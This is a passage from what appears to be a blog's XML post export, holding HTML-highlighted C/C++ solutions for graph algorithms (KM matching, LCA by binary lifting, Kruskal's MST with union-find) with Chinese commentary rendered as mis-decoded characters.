(vis_house[house]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> gap = ex_user[user] + ex_house[house] - love[user][house];</span><br><span class="line">        <span class="keyword">if</span> (gap == <span class="number">0</span>) &#123;</span><br><span class="line">            vis_house[house] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (match[house] == <span class="number">-1</span> || dfs(match[house])) &#123;</span><br><span class="line">                match[house] = user;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            slack[house] = <span class="built_in">min</span>(slack[house], gap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(match, <span class="number">-1</span>, <span class="keyword">sizeof</span> match);</span><br><span class="line">    <span class="built_in">memset</span>(ex_house, <span class="number">0</span>, <span class="keyword">sizeof</span> ex_house);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        ex_user[i] = love[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; N; ++j) &#123;</span><br><span class="line">            ex_user[i] = <span class="built_in">max</span>(ex_user[i], love[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        <span class="built_in">fill</span>(slack, slack + N, INF);</span><br><span class="line">       <span class="comment">//å¦‚æœä¸ºç”¨æˆ· i åŒ¹é…æˆ¿å­å¤±è´¥ åˆ™é€šè¿‡é™ä½æœŸæœ›å€¼è¿›è¡Œå°è¯•åŒ¹é…</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">memset</span>(vis_user, <span class="literal">false</span>, <span class="keyword">sizeof</span> vis_user);</span><br><span class="line">            <span class="built_in">memset</span>(vis_house, <span class="literal">false</span>, <span class="keyword">sizeof</span> vis_house);</span><br><span class="line">            <span class="comment">// å¦‚æœä¸ºç”¨æˆ· i åŒ¹é…æˆ¿å­æˆåŠŸ</span></span><br><span class="line">            <span class="keyword">if</span> (dfs(i)) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">int</span> d = INF;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j)</span><br><span class="line">                <span class="keyword">if</span> (!vis_house[j]) d = <span class="built_in">min</span>(d, slack[j]);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vis_user[j]) ex_user[j] -= d;</span><br><span class="line">                <span class="keyword">if</span> (vis_house[j])</span><br><span class="line">                    ex_house[j] += d;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    slack[j] -= d;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) res += love[match[i]][i];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;love[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, KM());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>DFS</tag>
        <tag>åŒˆç‰™åˆ©ç®—æ³•</tag>
        <tag>KM</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨å€å¢çš„æ€æƒ³å®ç°LCAç®—æ³•</title>
    <url>/2021/05/27/%E5%88%A9%E7%94%A8%E5%80%8D%E5%A2%9E%E7%9A%84%E6%80%9D%E6%83%B3%E5%AE%9E%E7%8E%B0LCA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>LCA</code>ç®—æ³•æŒ‡çš„æ˜¯æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆ<code>Lowest Common Ancestor</code>ï¼‰ï¼Œè¿™é‡Œçš„æœ€è¿‘æŒ‡çš„æ˜¯ç»™å®šçš„ä¸¤ä¸ªç‚¹ä¸­æ‰€æœ‰çš„å…¬å…±ç¥–å…ˆä¸­ï¼Œè·ç¦»æ ¹èŠ‚ç‚¹æœ€è¿œçš„èŠ‚ç‚¹ï¼Œè€Œä¸”è¿™ä¸¤ç‚¹åˆ°æœ€è¿‘å…¬å…±ç¥–å…ˆçš„è·ç¦»åªå’Œä¹Ÿæ˜¯è¿™ä¸¤ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ã€‚<a id="more"></a></p>
<h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>å®ç°è¯¥ç®—æ³•ä¸€èˆ¬æ˜¯å€ŸåŠ©æ¯ä¸ªèŠ‚ç‚¹çš„æ·±åº¦ä¿¡æ¯è¿›è¡Œæ±‚è§£ï¼Œå…·ä½“ä¸ºï¼š</p>
<p>å‡è®¾è¦æ±‚<code>x</code>å’Œ<code>y</code>çš„<code>LCA</code> ï¼Œä¸å¦¨å‡è®¾<code>depth[x] &gt; depth[y]</code>ï¼Œæˆ‘ä»¬å…ˆè®©<code>x</code>å¾€ä¸Šè·³ï¼ˆæœç€æ ¹çš„æ–¹å‘ï¼‰ï¼Œç›´åˆ°äºŒè€…çš„æ·±åº¦ç›¸åŒï¼Œç„¶å<code>x</code>å’Œ<code>y</code>åŒæ—¶ç½‘ä¸Šè·³ï¼Œæœ€ç»ˆäºŒè€…ä¸€å®šä¼šåœ¨æŸä¸€ç‚¹ç›¸é‡ï¼Œè¿™ç‚¹å°±æ˜¯æ‰€æ±‚ã€‚</p>
<p>è¿™ä¹Ÿå«æœ´ç´ å®ç°æ–¹æ³•ï¼Œå½“ä¸€æ£µæ ‘æ·±åº¦å¾ˆå¤§ï¼ŒæŸ¥è¯¢ç‚¹éƒ½æ˜¯æ¯”è¾ƒæ·±çš„æ—¶å€™ï¼Œæ­¤æ—¶åœ¨ç½‘ä¸Šè·³çš„è¿‡ç¨‹ä¼šèŠ±è´¹å¤§é‡çš„æ—¶é—´ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯<code>O(n)</code>ã€‚</p>
<p>è€Œå€å¢æ€æƒ³è§£å†³çš„æ˜¯ï¼Œä¼˜åŒ–å‘ä¸Šè·³è½¬çš„è¿‡ç¨‹ï¼Œæ¯æ¬¡å°½å¯èƒ½åœ°å¾€ä¸Šè·³æ›´å¤šçš„è·ç¦»ã€‚</p>
<p>ç›¸å…³ä»£ç è¯´æ˜è¯·çœ‹ä»£ç æ³¨é‡Šï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">// const int MAX_N = 5e5 + 1, MAX_M = 5e5 + 1;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">5e2</span> + <span class="number">1</span>, MAX_M = <span class="number">5e2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v, next;</span><br><span class="line">&#125;edges[MAX_M &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="comment">// head[] èŠ‚ç‚¹içš„ç¬¬ä¸€æ¡è¾¹ï¼Œdepth[] èŠ‚ç‚¹çš„æ·±åº¦, f[][] ç¬¬iå·èŠ‚ç‚¹çš„ç¬¬2^jä¸ªç¥–å…ˆ</span></span><br><span class="line"><span class="keyword">int</span> head[MAX_N], edgeNum = <span class="number">1</span>, depth[MAX_N], f[MAX_N][<span class="number">22</span>], n;</span><br><span class="line"><span class="comment">// é¢„å¤„ç† log2(i) å‘ä¸‹å–æ•´çš„å€¼</span></span><br><span class="line"><span class="keyword">int</span> lg2[MAX_N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preLg2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    lg2[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; ++i) </span><br><span class="line">	  lg2[i] = lg2[i - <span class="number">1</span>] + (<span class="number">2</span> &lt;&lt; lg2[i - <span class="number">1</span>] == i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é‡‡ç”¨é“¾å¼å‰å‘æ˜Ÿæ–¹å¼æ¨¡æ‹Ÿé“¾è¡¨</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    edges[edgeNum].v = v, edges[edgeNum].next = head[u];</span><br><span class="line">    head[u] = edgeNum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¿«é€Ÿè¯»å…¥ï¼Œå¯ç†è§£ä¸º scanf()</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> ch = getchar();</span><br><span class="line">    <span class="keyword">while</span> (ch &lt; <span class="string">'0'</span>  || ch &gt; <span class="string">'9'</span>)ch = getchar();</span><br><span class="line">    <span class="keyword">while</span> (ch &lt;= <span class="string">'9'</span> &amp;&amp; ch &gt;= <span class="string">'0'</span>)&#123;</span><br><span class="line">        sum = (sum &lt;&lt; <span class="number">1</span>)  + (sum &lt;&lt; <span class="number">3</span>) + ch - <span class="string">'0'</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nowId, <span class="keyword">int</span> fa)</span></span>&#123;</span><br><span class="line">    <span class="comment">// ç¬¬ 2 ^ 0 å³ç¬¬ä¸€ä¸ªç¥–å…ˆï¼ˆä» nowId å¾€æ ¹èŠ‚ç‚¹æ–¹å‘ï¼‰</span></span><br><span class="line">    f[nowId][<span class="number">0</span>] = fa;</span><br><span class="line">    depth[nowId] = depth[fa] + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= lg2[depth[nowId]]; i++)</span><br><span class="line">        <span class="comment">// nowId çš„ç¬¬ 2 ^ i ç¥–å…ˆæ˜¯å®ƒçš„ç¬¬ 2 ^ (i - 1)ä¸ªç¥–å…ˆçš„ç¬¬ 2 ^ (i - 1)ä¸ªç¥–å…ˆ</span></span><br><span class="line">        <span class="comment">// è¦ç”»å›¾æ‰èƒ½ç†è§£</span></span><br><span class="line">        f[nowId][i] = f[f[nowId][i - <span class="number">1</span>]][i - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> eId = head[nowId]; eId; eId = edges[eId].next)</span><br><span class="line">        <span class="keyword">if</span> (edges[eId].v != fa)dfs(edges[eId].v, nowId);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lca</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (depth[x] &lt; depth[y])swap(x, y);</span><br><span class="line">    <span class="comment">// ç›®çš„æ˜¯å°†äºŒè€…å¤„ç†åˆ°åŒä¸€ä¸ªé«˜åº¦</span></span><br><span class="line">    <span class="keyword">while</span> (depth[x] &gt; depth[y])</span><br><span class="line">        <span class="comment">// ä»¥é«˜åº¦å·®ä¸ºä¾æ®è¿›è¡Œè·³</span></span><br><span class="line">        x = f[x][lg2[depth[x] - depth[y]]];</span><br><span class="line">    <span class="comment">// äºŒè€…ç›¸ç­‰ï¼Œæ¯«æ— ç–‘é—®ï¼Œæ­¤æ—¶ x å°±æ˜¯ y çš„ç¥–å…ˆ</span></span><br><span class="line">    <span class="keyword">if</span>(x == y)<span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> <span class="built_in">step</span> = lg2[depth[x]];<span class="built_in">step</span> &gt;= <span class="number">0</span>; <span class="built_in">step</span>--)</span><br><span class="line">        <span class="keyword">if</span> (f[x][<span class="built_in">step</span>] != f[y][<span class="built_in">step</span>])</span><br><span class="line">            x = f[x][<span class="built_in">step</span>], y = f[y][<span class="built_in">step</span>];</span><br><span class="line">    <span class="keyword">return</span> f[x][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">int</span> m = <span class="built_in">read</span>(), s = <span class="built_in">read</span>(), u, v;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">        add(u, v), add(v, u);</span><br><span class="line">    &#125;</span><br><span class="line">    preLg2();</span><br><span class="line">    dfs(s, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, lca(u, v));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 5 4</span></span><br><span class="line"><span class="comment">3 1</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">5 1</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">3 2</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®å‚è€ƒï¼š<a href="https://www.luogu.com.cn/problem/P3379" target="_blank" rel="noopener">æ´›è°·P3397</a></p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>å€å¢æ€æƒ³</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨å¹¶æŸ¥é›†æ±‚æœ€å°ç”Ÿæˆæ ‘</title>
    <url>/2020/04/10/%E5%88%A9%E7%94%A8%E5%B9%B6%E6%9F%A5%E9%9B%86%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
    <content><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯-Kruskal-ç®—æ³•ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Kruskal-ç®—æ³•ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Kruskal ç®—æ³•ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Kruskal ç®—æ³•ï¼Ÿ</h2><p><strong>Kruskal</strong> ç®—æ³•æ˜¯æ±‚æœ€å°ç”Ÿæˆæ ‘çš„ä¸€ç§æ–¹æ³•ï¼Œæœ‰ç‚¹ç±»ä¼¼äºè´ªå¿ƒç®—æ³•ï¼Œé¦–å…ˆæ˜¯æŒ‰ç…§è¾¹çš„æƒå€¼ä»å°åˆ°å¤§è¿›è¡Œæ’åºï¼Œç„¶åä¸æ–­åœ°å°†è¾ƒå°çš„è¾¹åŠ å…¥åˆ°è¿‡ç¨‹è§£çš„é›†åˆï¼Œå…³é”®æ˜¯è¦è§£å†³å›è·¯çš„é—®é¢˜ï¼Œè€Œåˆ©ç”¨å¹¶æŸ¥é›†å°±å¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå³æ¯æ¬¡æ·»åŠ è¾¹ä¹‹å‰ï¼Œåˆ¤æ–­è¯¥è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹æ˜¯å¦æ˜¯å¤„äºç›¸åŒçš„é›†åˆï¼Œç›¸åŒå°±è·³è¿‡ï¼Œå¦åˆ™åŠ å…¥åˆ°è¿‡ç¨‹è§£ä¸­ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼ŒçŸ¥é“æœ€ååªæœ‰ä¸€ä¸ªé›†åˆï¼Œè¯¥é›†åˆå³ä¸ºæ‰€æ±‚ã€‚<a id="more"></a></p>
<h2 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h2><p>æ¥æºäº<a href="https://www.luogu.com.cn/problem/P3366" target="_blank" rel="noopener">æ´›è°·</a></p>
<h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å¦‚é¢˜ï¼Œç»™å‡ºä¸€ä¸ªæ— å‘å›¾ï¼Œæ±‚å‡ºæœ€å°ç”Ÿæˆæ ‘ï¼Œå¦‚æœè¯¥å›¾ä¸è¿é€šï¼Œåˆ™è¾“å‡º <code>orz</code>ã€‚</p>
<h3 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h3><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° N,<em>M</em>ï¼Œè¡¨ç¤ºè¯¥å›¾å…±æœ‰ <em>N</em> ä¸ªç»“ç‚¹å’Œ <em>M</em> æ¡æ— å‘è¾¹ã€‚</p>
<p>æ¥ä¸‹æ¥ <em>M</em> è¡Œæ¯è¡ŒåŒ…å«ä¸‰ä¸ªæ•´æ•° X<sub>i</sub>ï¼Œ  Y<sub>i</sub>ï¼Œ  Z<sub>i</sub>ï¼Œè¡¨ç¤ºæœ‰ä¸€æ¡é•¿åº¦ä¸º   Z<sub>i</sub> çš„æ— å‘è¾¹è¿æ¥ç»“ç‚¹   X<sub>i</sub>ï¼Œ  Y<sub>i</sub></p>
<h3 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h3><p>å¦‚æœè¯¥å›¾è¿é€šï¼Œåˆ™è¾“å‡ºä¸€ä¸ªæ•´æ•°è¡¨ç¤ºæœ€å°ç”Ÿæˆæ ‘çš„å„è¾¹çš„é•¿åº¦ä¹‹å’Œã€‚å¦‚æœè¯¥å›¾ä¸è¿é€šåˆ™è¾“å‡º <code>orz</code>ã€‚</p>
<h2 id="æ±‚è§£ï¼š"><a href="#æ±‚è§£ï¼š" class="headerlink" title="æ±‚è§£ï¼š"></a>æ±‚è§£ï¼š</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-01-21 11:11:04</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-10 22:51:47</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\luo_gu\P3366.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  //åˆ©ç”¨kruskalç®—æ³•</span></span></span><br><span class="line"><span class="keyword">int</span> arc[<span class="number">200001</span>][<span class="number">3</span>], n, m;  <span class="comment">// arcçš„æœ€åä¸€ä¸ªä»£è¡¨æƒå€¼ï¼Œå‰ä¸¤ä¸ªä»£è¡¨é‚»æ¥ç‚¹</span></span><br><span class="line"><span class="keyword">int</span> arc_index[<span class="number">200001</span>];  <span class="comment">//å­˜æ”¾è¾¹çš„ç¼–å·,æ’åºåå¾—åˆ°çš„æ˜¯æŒ‰ç…§è¾¹æƒå€¼å‡åºçš„ç¼–å·</span></span><br><span class="line"><span class="keyword">int</span> anc[<span class="number">200001</span>];  <span class="comment">//å¹¶æŸ¥é›†è¾…åŠ©æ•°ç»„,å­˜æ”¾æ¯ä¸€ä¸ªç‚¹å±äºçš„é›†åˆ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_anc</span><span class="params">(<span class="keyword">int</span> son)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (anc[son] == son)</span><br><span class="line">        <span class="keyword">return</span> son;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//å‹ç¼©è·¯å¾„</span></span><br><span class="line">        anc[son] = find_anc(anc[son]);</span><br><span class="line">        <span class="keyword">return</span> anc[son];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &gt;= right) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> l = left, r = right, piv = arc_index[left];</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r &amp;&amp; arc[arc_index[r]][<span class="number">2</span>] &gt;= arc[piv][<span class="number">2</span>]) r--;</span><br><span class="line">        arc_index[l] = arc_index[r];</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r &amp;&amp; arc[arc_index[l]][<span class="number">2</span>] &lt;= arc[piv][<span class="number">2</span>]) l++;</span><br><span class="line">        arc_index[r] = arc_index[l];</span><br><span class="line">    &#125;</span><br><span class="line">    arc_index[l] = piv;</span><br><span class="line">    q_sort(left, l - <span class="number">1</span>);</span><br><span class="line">    q_sort(r + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) anc[i] = i;  <span class="comment">//åˆšå¼€å§‹æ¯ä¸€ä¸ªç‚¹æ˜¯å•ç‹¬çš„é›†åˆ</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;arc[i][<span class="number">0</span>], &amp;arc[i][<span class="number">1</span>], &amp;arc[i][<span class="number">2</span>]);</span><br><span class="line">        arc_index[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    q_sort(<span class="number">0</span>, m - <span class="number">1</span>);          <span class="comment">//å°†è¾¹çš„æƒå€¼æ’åº</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;  <span class="comment">//ä¾æ¬¡æŠŠæœ€å°çš„è¾¹è¿›è¡Œâ€œå¹¶â€</span></span><br><span class="line">        <span class="comment">// å¦‚æœåŒå±äºâ€œç¥–å…ˆâ€ï¼Œåˆ™è·³è¿‡</span></span><br><span class="line">        <span class="keyword">if</span> (find_anc(arc[arc_index[i]][<span class="number">1</span>]) == find_anc(arc[arc_index[i]][<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// å¦‚æœä¸åŒï¼Œåˆ™è¯´æ˜æ˜¯ç¬¦åˆï¼Œå¯ä»¥æ·»åŠ </span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            anc[find_anc(anc[arc[arc_index[i]][<span class="number">0</span>]])] = arc[arc_index[i]][<span class="number">1</span>];</span><br><span class="line">            sum += arc[arc_index[i]][<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">1 2 2</span></span><br><span class="line"><span class="comment">1 3 8</span></span><br><span class="line"><span class="comment">1 4 3</span></span><br><span class="line"><span class="comment">2 3 4</span></span><br><span class="line"><span class="comment">3 4 3</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å¹¶æŸ¥é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>åŒˆç‰™åˆ©ç®—æ³•æ±‚è§£äºŒåˆ†å›¾çš„æœ€å¤§åŒ¹é…</title>
    <url>/2020/11/27/%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E4%BA%8C%E5%88%86%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><a href="https://baike.baidu.com/item/%E4%BA%8C%E5%88%86%E5%9B%BE" target="_blank" rel="noopener">äºŒåˆ†å›¾</a>ï¼š</p>
<p>è®¾<code>G=(V,E)</code>æ˜¯ä¸€ä¸ªæ— å‘å›¾ï¼Œå¦‚æœé¡¶ç‚¹<code>V</code>å¯åˆ†å‰²ä¸ºä¸¤ä¸ªäº’ä¸ç›¸äº¤çš„å­é›†<code>(A,B)</code>ï¼Œå¹¶ä¸”å›¾ä¸­çš„æ¯æ¡è¾¹<code>ï¼ˆiï¼Œjï¼‰</code>æ‰€å…³è”çš„ä¸¤ä¸ªé¡¶ç‚¹<code>i</code>å’Œ<code>j</code>åˆ†åˆ«å±äºè¿™ä¸¤ä¸ªä¸åŒçš„é¡¶ç‚¹é›†<code>(i in A,j in B)</code>ï¼Œåˆ™ç§°å›¾<code>G</code>ä¸ºä¸€ä¸ªäºŒåˆ†å›¾ã€‚</p>
<p>åŒ¹é…ï¼š</p>
<p>ç»™å®šä¸€ä¸ªäºŒåˆ†å›¾<code>G</code>ï¼Œåœ¨<code>G</code>çš„ä¸€ä¸ªå­å›¾Mä¸­ï¼Œ<code>M</code>çš„è¾¹é›†<code>{E}</code>ä¸­çš„ä»»æ„ä¸¤æ¡è¾¹éƒ½ä¸äº¤æ±‡äºåŒä¸€ä¸ªç»“ç‚¹ï¼Œåˆ™ç§°<code>M</code>æ˜¯ä¸€ä¸ªåŒ¹é…ã€‚<a id="more"></a></p>
